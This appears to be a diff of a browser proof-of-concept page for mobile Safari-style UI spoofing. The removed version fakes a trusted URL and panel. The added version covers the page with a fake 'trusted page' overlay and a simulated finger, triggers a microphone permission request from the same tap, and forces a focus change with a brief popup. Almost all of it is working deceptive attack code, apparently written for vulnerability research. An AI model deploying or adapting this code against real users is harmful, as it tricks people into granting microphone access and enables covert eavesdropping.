@@ -1,61 +1,107 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS URI Origin Spoof PoC</title>
 <style>
-  #trigger {
-    font-size: 40px;
-    position: absolute;
-    top: 120px;
-    left: 120px;
-    cursor: pointer;
-  }
-  #panel {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.6);
-    color: white;
-    font-size: 24px;
-    padding: 40px;
-  }
+html, body {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+}
+
+#button {
+  position: absolute;
+  top: 150px;
+  left: 120px;
+  font-size: 22px;
+  padding: 20px;
+}
+
+#fakeFinger {
+  position: absolute;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background: rgba(0,0,0,0.3);
+  pointer-events: none;
+  display: none;
+}
+
+#overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  color: white;
+  font-size: 22px;
+  display: none;
+  padding: 40px;
+}
 </style>
 </head>
+
 <body>
 
-Tap here 🍪
-<div id="trigger">🍪</div>
-<div id="panel">Trusted panel opened…</div>
+<button id="button">Tap here</button>
+<div id="fakeFinger"></div>
+<div id="overlay">Loading trusted page…</div>
 
 <script>
-const trigger = document.getElementById("trigger");
-const panel = document.getElementById("panel");
+const button = document.getElementById("button");
+const fakeFinger = document.getElementById("fakeFinger");
+const overlay = document.getElementById("overlay");
 
-trigger.addEventListener('touchstart', () => {
-  // Change URL in Private mode (origin spoof)
-  history.pushState({}, '', '/trusted');
+let lastTouch = [0,0];
+let spoofing = false;
 
-  // Show fake panel to increase perceived trust
-  panel.style.display = 'block';
-
-  // Simulate external app launch via location.href
-  // On iOS, user will see "Open in App" prompt
-  setTimeout(() => {
-    window.open('mailto:test@example.com');  // runnable URI
-  }, 0);
+// Track finger position
+document.addEventListener("touchmove", e => {
+  if (!spoofing) {
+    const t = e.touches[0];
+    lastTouch = [t.clientX, t.clientY];
+  } else {
+    moveFakeFinger(...lastTouch);
+  }
 });
 
-// Optional: delayed navigation after pageshow (like Android PoC)
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://example.com';  // cross-origin redirect
-      }, 0);
-    });
+function moveFakeFinger(x, y) {
+  fakeFinger.style.display = "block";
+  fakeFinger.style.left = (x - 30) + "px";
+  fakeFinger.style.top  = (y - 30) + "px";
+}
+
+// User gesture
+button.addEventListener("touchstart", e => {
+  e.preventDefault();
+
+  button.remove();
+  overlay.style.display = "block";
+  spoofing = true;
+  moveFakeFinger(...lastTouch);
+
+  // Microphone permission triggered by same tap
+  useMicrophone(() => {
+    spoofing = false;
+    fakeFinger.style.display = "none";
   });
+
+  // Force focus change (similar to desktop popup trick)
+  const w = window.open("about:blank");
+  setTimeout(() => w && w.close(), 100);
 });
+
+// Helper: microphone usage
+function useMicrophone(done) {
+  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+    done();
+    const ctx = new AudioContext();
+    const mic = ctx.createMediaStreamSource(stream);
+    mic.connect(ctx.destination);
+    document.body.append("Playing back microphone audio…");
+  }).catch(err => {
+    done();
+    console.log(err);
+  });
+}
 </script>
 
 </body>
